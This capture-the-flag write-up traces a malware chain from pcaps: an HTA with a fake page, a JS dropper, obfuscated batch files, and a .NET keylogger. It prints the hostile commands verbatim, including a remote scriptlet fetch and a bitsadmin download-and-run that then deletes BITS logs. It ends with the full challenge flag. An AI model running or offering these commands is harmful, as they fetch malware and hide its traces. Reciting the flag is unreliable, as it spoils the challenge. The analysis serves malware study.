+++
title = "Mr Anderson - Writeup"
draft = false
ShowToc = false
author = ["connar"]
+++

# This is a writeup for the babufscation challenge
This challenge gives us a zip file containing 3 pcap files:  

![alt text](images/image.png)

What we have to do is to first find the order of the scripts that were executed in the attack in order to know what was executed first, what other file it dropped etc.

We can easily identify the order by opening all 3 pcaps and observing the date and time of the first packet of each pcap.   

![alt text](images/image-1.png)

By doing so, we notice that firstly, an .hta file was downloaded and run. This .hta file probably downloaded the second file which is a javascript file, and this javascript file probably downloaded the last file which is a .bat one.

We can export all the files through File-->Export Objects-->HTTP.

Let's start analyzing the first file: "noticeJuly.hta"
Running the file, we are met with the following window:  

![alt text](images/image-3.png)

Opening the file in a text editor, we observe the following fake looking page:  

![alt text](images/image-2.png)

We see a very suspicious command that is executed upon clicking the Refresh Button. We can use the CMD Watcher tool (not that it is needed) to see that indeed this sus looking command is being run upon clicking the button:  

![alt text](images/image-4.png)

Let's analyze this command that is being run. The command is the following:
```
C:\Windows\System32\cONhosT.exe %COMSpeC% /V/D/c "S^eT SSG=C:\kfldeokgr\&& mD !SSG!>nul 2>&1&&S^eT UFWN=!SSG!^KGRAAKR.JS&&<nul set/p LAXA=var LAXA='\u0055\u004c\u0064\u002b\u0044\u0055\u004c\u0064\u002b\u0045\u0055\u004c\u0064\u002b\u0022\u002f\u002f\u0063\u0030\u0072\u0061\u0078\u002e\u0065\u0070\u0068\u0033\u006b\u0064\u006f\u006c\u006d\u0066\u0061\u002e\u0063\u006c\u006f\u0075\u0064\u002f\u003f\u0032\u002f\u0022\u0029\u003b';SSG='\u003a\u0068\u0022\u003b\u0045\u0055\u004c\u0064\u003d\u0022\u0054\u0074\u0022\u002b\u0022\u0050\u003a\u0022\u003b\u0047\u0065\u0074\u004f\u0062\u006a\u0065\u0063\u0074\u0028\u0043';PEBC='\u0076\u0061\u0072\u0020\u0043\u0055\u004c\u0064\u003d\u0022\u0073\u0022\u002b\u0022\u0063\u0072\u0022\u003b\u0044\u0055\u004c\u0064\u003d\u0022\u0069\u0070\u0074\u0022\u002b\u0022';UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); >!UFWN!|caLl !UFWN!||caLl !UFWN! "
```

Firstly, let's take the unicode values and convert them to plaintext. You can use this cyberchef command to decode them:
- [CyberChef Command](https://gchq.github.io/CyberChef/#recipe=Unescape_Unicode_Characters('%5C%5Cu')&input=TEFYQT1cdTAwNTVcdTAwNGNcdTAwNjRcdTAwMmJcdTAwNDRcdTAwNTVcdTAwNGNcdTAwNjRcdTAwMmJcdTAwNDVcdTAwNTVcdTAwNGNcdTAwNjRcdTAwMmJcdTAwMjJcdTAwMmZcdTAwMmZcdTAwNjNcdTAwMzBcdTAwNzJcdTAwNjFcdTAwNzhcdTAwMmVcdTAwNjVcdTAwNzBcdTAwNjhcdTAwMzNcdTAwNmJcdTAwNjRcdTAwNmZcdTAwNmNcdTAwNmRcdTAwNjZcdTAwNjFcdTAwMmVcdTAwNjNcdTAwNmNcdTAwNmZcdTAwNzVcdTAwNjRcdTAwMmZcdTAwM2ZcdTAwMzJcdTAwMmZcdTAwMjJcdTAwMjlcdTAwM2IKClNTRz1cdTAwM2FcdTAwNjhcdTAwMjJcdTAwM2JcdTAwNDVcdTAwNTVcdTAwNGNcdTAwNjRcdTAwM2RcdTAwMjJcdTAwNTRcdTAwNzRcdTAwMjJcdTAwMmJcdTAwMjJcdTAwNTBcdTAwM2FcdTAwMjJcdTAwM2JcdTAwNDdcdTAwNjVcdTAwNzRcdTAwNGZcdTAwNjJcdTAwNmFcdTAwNjVcdTAwNjNcdTAwNzRcdTAwMjhcdTAwNDMKClBFQkM9XHUwMDc2XHUwMDYxXHUwMDcyXHUwMDIwXHUwMDQzXHUwMDU1XHUwMDRjXHUwMDY0XHUwMDNkXHUwMDIyXHUwMDczXHUwMDIyXHUwMDJiXHUwMDIyXHUwMDYzXHUwMDcyXHUwMDIyXHUwMDNiXHUwMDQ0XHUwMDU1XHUwMDRjXHUwMDY0XHUwMDNkXHUwMDIyXHUwMDY5XHUwMDcwXHUwMDc0XHUwMDIyXHUwMDJiXHUwMDIy)

The command that is left is the following:
```
C:\Windows\System32\cONhosT.exe %COMSpeC% /V/D/c "S^eT SSG=C:\kfldeokgr\&& mD !SSG!>nul 2>&1&&S^eT UFWN=!SSG!^KGRAAKR.JS&&<nul set/p LAXA=var LAXA='ULd+DULd+EULd+"//c0rax.eph3kdolmfa.cloud/?2/");';SSG=':h";EULd="Tt"+"P:";GetObject(C';PEBC='var CULd="s"+"cr";DULd="ipt"+"';UFWN=PEBC+SSG+LAXA;PADO=new Function(UFWN);PADO(); >!UFWN!|caLl !UFWN!||caLl !UFWN! "
```

Analyzing the command, here are the takeaways:
- ```C:\Windows\System32\cONhosT.exe %COMSpeC% /V/D/c```: It will open a cmd window with the /V/D/c parameters.
- ```S^eT SSG=C:\kfldeokgr\&& mD !SSG!>nul 2>&1```: Sets a variable SSG to a path and then creats this path using mD (an alias for make directory), redirecting the output accordingly.
- ```S^eT UFWN=!SSG!^PEBCPADO.JS```: Sets the previously mentioned path with a .js filename to the variable UFWN.
- <```nul set/p LAXA=var LAXA='ULd+DULd+EULd+"//c0rax.eph3kdolmfa.cloud/?2/");';
SSG=':h";EULd="Tt"+"P:";GetObject(C';PEBC='var CULd="s"+"cr";DULd="ipt"+"';
UFWN=PEBC+SSG+LAXA```: This basically creates some javascript code and stores it in the LAXA variable.
- ```PADO=new Function(UFWN);PADO()```: This creates a js function with the code set in UFWN variable and runs it.

By deobfuscating the js code, we are basically left with this code:
```js
var CULd="s"+"cr";
DULd="ipt"+":h";
EULd="Tt"+"P:";
GetObject(CULd+DULd+EULd+"//c0rax.eph3kdolmfa.cloud/?2/");
//which basically is--> script:http://c0rax.eph3kdolmfa.cloud/?2/
```

This is all for the .hta file. It creates a .js file. This .js file creates an instance of a COM object retrieved from the specified url.

Finally, by using >!UFWN!|caLl !UFWN!||caLl !UFWN! the .js file is run. That's all for this .hta file. Now let's move to the second pcap which contains the .js code retrieved, which is the stage 2 of the attack.

The code in the .js file is the following:
```js
var lt135 = "QCVwcm9ncmFtZmlsZXM6fjE1LDElJWNvbXNwZWM6fi0xMiwxJSVjb21zcGVjOn4xNCwxJSVwcm9ncmFtZmlsZXM6fjEwLDElJz1eIj4lY29tbW9ucHJvZ3JhbWZpbGVzOn4#%MiwxJXUlcHJvZ3JhbWZpbGVzOn4xM#%wxJSZAJWNvbXNwZWM6fi0zLDElJWNvbXNwZWM6fjIwLDElaCVjb21tb25wcm9ncmFtZmlsZXM6fjE4LDElJWNvbW1vbnB#%b2d#%YW1maWxlczp+MjMsMSUlY29tbW9ucHJvZ3JhbWZpbGVzOn4tMTEsMSVmZiZAJWNvbW1vbnB#%b2d#%YW1maWxlczp+LTEsMSUlY29tc3BlYzp+LTEsMSUlY29tc3BlYzp+LTEzLDElJXB#%b2d#%YW1maWxlczp+LTYsMSUnPSVvczp+NSwxJV5eXi1eXl43Xl5eJXBh---snip---"
var re = new RegExp("#%", "g");
lt135 = lt135.replace(re, "y");
var gj4fjrg = WScript.CreateObject("WScript.Shell");
var fkfo3l = gj4fjrg.ExpandEnvironmentStrings("%appdata%");
var whshis4 = fkfo3l + "\\kQiFcryrxG.bat";
var dcdd = decodeBase64(lt135);
writeBytes(whshis4, dcdd);
gj4fjrg.run("\"" + whshis4 + "\"");
```

This basically makes some replacements in the specified code, decodes the long b64 string and saves it in the appdata folder as a .bat file.
By following the same operations, we end up with this .bat file:  

![alt text](images/image-5.png)

This kinda seems like normal envar obfuscation but it is slightly different. It combines multiple known batch obfuscation techniques, such as pre existing envars, custom dictionary etc. One could try to deobfuscate this manually, but there is a twist in this specific batch file. Let's save it and upload it to VirusTotal to see what I mean:  

![alt text](images/image-6.png)

The thing to take away here is that VirusTotal sometimes will identify known techniques and specify them. Here, we see an interesting text: "BatchEncryption". Let's google this and see what comes up:  

![alt text](images/image-7.png)

Damn. By opening a few tabs and reading the articles (well, translated except if you know chinese), we learn that this is a tecnhique implemented by a tool named BatchEncryptor which was created by gwsbhqt@163.com.
There is also the corresponding tool to decode the whole .bat file for us!
This tool exists in this repo:
- https://github.com/cnHopeStudio/Batch-Encryption-DeCoder (its the first google search result we got previously).

By building this tool and running it, we get the deobfuscated bat code which is...another obfuscated command:  

![alt text](images/image-8.png)

The new command we are called to deobfuscate is:
```bat
cmd /V /C "set shgyngmcqs=0XoY&Ndh%Cas3WlpPRn\meFQwgf/U2D5T:.k tbzri*uMc&&FOR %A IN (38 41 37 11 10 6 20 41 18 36 27 37 40 10 18 11 26 21 40 36 17 28 5 32 23 12 11 0 5 39 6 26 5 29 25 39 5 32 5 26 3 29 25 0 44 13 31 35 1 39 45 39 3 29 7 43 44 13 5 2 44 39 28 36 7 37 37 15 33 27 27 11 43 18 40 41 39 25 14 12 27 37 34 38 10 37 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 8 37 20 15 8 19 37 34 38 10 37 36 4 36 11 45 36 11 37 2 15 36 38 41 37 11 36 4 36 37 41 20 21 2 43 37 36 31 36 4 36 6 21 14 36 27 23 36 27 22 36 9 33 19 16 40 2 25 40 10 20 30 10 37 10 19 44 41 45 40 2 11 2 26 37 19 5 21 37 24 2 40 35 19 30 2 24 18 14 2 10 6 21 40 19 42 36 4 36 11 45 36 11 37 10 40 37 36 38 41 37 11 1337) DO set xqzwdomkia=!xqzwdomkia!!shgyngmcqs:~%A,1!&& IF %A==1337 CALL %xqzwdomkia:~-213%"
```

If we read this carefully, we will see that it is not that difficult to deobfuscate. Basically, it just sets a dictionary, then runs a loop and takes a specific character of the corresponding index based on the loop. It recreates the command to be run and then calls it. Let's use python to deobfuscate this:  

![alt text](images/image-9.png)

Note: The technique used is an existing one and is called "forencoding obfuscation".

The result we get is the following bitsadmin command:
```
bitsadmin /transfer RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU http://sunrizgl3/t.bat %tmp%\\t.bat & %tmp%\\t.bat & sc stop bits & timeout 5 & del /Q /F C:\\ProgramData\\Microsoft\\Network\\Downloader\\* & sc start bits
```

Bitsadmin command creates jobs and assigns them a task. Here, bitsadmin creates a job named RUNTQ3s0NzdfN2gzNTNfY2g0MW5kXzczY2huMWNoMzU to download a .bat file from a domain, run it, then stop the bitsadmin process in order to delete its logs and then starts it again. We can agree on that the job's name is really sus and if we decode it from b64 we get the first part of the flag:  

![alt text](images/image-10.png)

Nice. All that's left is the last .bat file in the remaining pcap. 
Opening it, we get another obfuscated .bat file different than the previous one:  

![alt text](images/image-11.png)

Again, one can try and deobfuscate it manually, but why not follow up with the same methodology as previously?
Loading the file in VT, we get another interesting name:  

![alt text](images/image-12.png)

It is not as easy as with the previous one to indentify the right name, but after a bit of googling we can see that Jlaive is a tool used for obfuscation that gives a matching result as the one we have:  

![alt text](images/image-13.png)

So basically, Jlaive is a tool used to convert .NET executables to obfuscated .bat files. Interesting. Well, for such a tool to exist, there must be the corresponding tool that does the reverse operation. Searching for a bit, we find a tool named Get-UnJlaive which can be found in the following repo:
- https://github.com/Dump-GUY/Get-UnJlaive  

This tool reconstructs the original executable before it was converted to this .bat. Setting up the tool and running it, we successfully get an executable back:  

![alt text](images/image-15.png)

If we run the file command on the .exe, we see its a Mono/.NET assembly:
```sh
└─$ file t.bat_orig.exe 
t.bat_orig.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

Loading the executable to DnSpy, we are met with...another seemingly obfuscated file:  

![alt text](images/image16.png)

This executable seems to have been packed with some .NET packer. This time, VT won't be of any help to us. We can either identify the packer used by either using a simple strings command which will reveal the path where this executable was stored at build time, or we can search through the functions of the executable and find the packer in the class "cab44dfc2d326bea8c4438eb03ca73b4d":
```csharp
using System;
using System.Reflection;

namespace A
{
	// Token: 0x02000007 RID: 7
	internal class cab44dfc2d326bea8c4438eb03ca73b4d
	{
		// Token: 0x0600001A RID: 26 RVA: 0x00003868 File Offset: 0x00001A68
		private static string ccea6e29829419d8153060be40cf7772a(Assembly cdefd3af7ac5b57777d7057f73f12ed1e)
		{
			string text = cdefd3af7ac5b57777d7057f73f12ed1e.FullName;
			int num = text.IndexOf(',');
			if (num >= 0)
			{
				text = text.Substring(0, num);
			}
			return text;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00003898 File Offset: 0x00001A98
		internal static void c5b6799dda81c5313f25256842d094434()
		{
			string text = "638492234169640792";
			DateTime dateTime = new DateTime(long.Parse(text));
			if (DateTime.Now > dateTime)
			{
				for (;;)
				{
					switch (4)
					{
					case 0:
						continue;
					}
					break;
				}
				if (!true)
				{
					RuntimeMethodHandle runtimeMethodHandle = methodof(cab44dfc2d326bea8c4438eb03ca73b4d.c5b6799dda81c5313f25256842d094434()).MethodHandle;
				}
				string text2 = cab44dfc2d326bea8c4438eb03ca73b4d.ccea6e29829419d8153060be40cf7772a(Assembly.GetExecutingAssembly());
				string text3 = string.Concat(new string[]
				{
					"The assembly '",
					text2,
					"' is created with an evaluation version of CryptoObfuscator and will stop working on ",
					dateTime.ToString("d-MMM-yyyy."),
					" The evaluation period has expired and the application will now exit."
				});
				throw new Exception(text3);
			}
		}
	}
}

```

CryptoObfuscator!
The only thing that is left to do is to find the corresponding tool to deobfuscate the executable for us. The one I will use can be found in the following repo:
- https://github.com/Rhotav/Crypto-Deobfuscator  

Building and running the tool, we get the deobfuscated file:  

![alt text](images/image17.png)


Searching through the deobfuscated methods, we see the executable is basically a keylogger that sends the logged keystrikes through email. In method_4, we can find the part2 of our flag:  

![alt text](images/image18.png)


Full flag: ECSC{477_7h353_ch41nd_73chn1ch35_f02_ju57_4_k3yl09932}